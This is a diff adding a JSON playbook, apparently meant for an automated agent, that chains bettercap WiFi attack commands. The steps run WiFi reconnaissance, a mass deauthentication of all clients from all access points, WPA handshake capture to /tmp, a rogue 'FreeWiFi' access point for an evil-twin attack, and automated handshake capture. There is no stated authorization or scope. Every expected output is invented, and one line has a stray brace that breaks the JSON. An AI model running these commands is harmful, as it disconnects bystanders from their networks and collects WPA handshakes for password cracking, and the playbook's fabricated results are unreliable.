@@ -1,0 +1,30 @@
+{
+  "name": "bettercap_wifi_attacks",
+  "description": "Advanced WiFi attacks including deauth, MITM, and WPA handshake capture using bettercap",
+  "pattern": "bettercap.*wifi|bettercap.*deauth|wifi.*mitm|bettercap.*handshake",
+  "parameters": ["interface"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bettercap", "args": ["-iface", "{{interface}}"]},
+      "expected_output": {"type": "string", "example": "bettercap v2.32.0 (built for linux amd64 with go1.19.1)\n\n{{interface}} > wifi.recon on\n[15:30:01] [sys.log] [inf] wifi WiFi recon started\n{{interface}} > wifi.show\n\n┌───────────────────────┬─────────────────┬────┬──────┬─────────────┬──────────┬───────────┬─────────────┐\n│       BSSID           │      SSID       │ Ch │ RSSI │ Encryption  │ Clients  │   Sent    │   Rcvd      │\n├───────────────────────┼─────────────────┼────┼──────┼─────────────┼──────────┼───────────┼─────────────┤\n│ AA:BB:CC:DD:EE:FF     │ MyNetwork       │ 6  │ -45  │ WPA2 (PSK)  │ 3        │ 1234      │ 5678        │\n│ 11:22:33:44:55:66     │ Office_WiFi     │ 11 │ -67  │ WPA2 (PSK)  │ 12       │ 4567      │ 8901        │\n└───────────────────────┴─────────────────┴────┴──────┴─────────────┴──────────┴───────────┴─────────────┘"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'wifi.recon on; wifi.deauth all' | bettercap -iface {{interface}} -eval"]},
+      "expected_output": {"type": "string", "example": "[15:30:15] [sys.log] [inf] wifi Deauthenticating all clients from all access points\n[15:30:15] [sys.log] [inf] wifi Sent 64 deauth frames to AA:BB:CC:DD:EE:FF\n[15:30:16] [sys.log] [inf] wifi Sent 64 deauth frames to 11:22:33:44:55:66\nMass deauth attack in progress"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'set wifi.handshakes.file /tmp/handshakes.pcap; wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF' | bettercap -iface {{interface}}"]},
+      "expected_output": {"type": "string", "example": "[15:30:20] [sys.log] [inf] wifi Handshakes will be saved to /tmp/handshakes.pcap\n[15:30:25] [sys.log] [war] wifi Got handshake for 'MyNetwork' (AA:BB:CC:DD:EE:FF)\nHandshake captured and saved"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'wifi.recon on; wifi.ap' | bettercap -iface {{interface}}"]},
+      "expected_output": {"type": "string", "example": "[15:30:30] [sys.log] [inf] wifi Creating access point\n[15:30:31] [sys.log] [inf] wifi AP 'FreeWiFi' started on channel 6\nRogue AP created for evil twin attack"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "bettercap -iface {{interface}} -caplet wifi-handshakes.cap"]},
+      "expected_output": {"type": "string", "example": "Loading caplet wifi-handshakes.cap\n[15:30:35] [sys.log] [inf] Automated handshake capture started\n[15:30:40] [sys.log] [war] Captured 3 WPA handshakes\nCaplet automation successful"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
